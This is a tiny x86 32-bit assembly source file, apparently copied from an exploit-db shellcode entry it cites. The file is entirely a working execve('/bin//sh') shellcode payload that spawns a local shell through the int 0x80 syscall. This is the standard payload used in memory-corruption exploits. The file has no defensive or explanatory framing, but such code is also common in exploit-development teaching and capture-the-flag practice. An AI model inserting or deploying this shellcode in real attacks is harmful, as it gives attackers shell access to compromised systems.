[SECTION .text]
global _start

; https://www.exploit-db.com/shellcodes/46809

_start:
    xor     ecx, ecx
    xor     edx, edx
    push    0xb
    pop     eax
    push    ecx
    push    0x68732f2f
    push    0x6e69622f
    mov     ebx, esp
    int     0x80
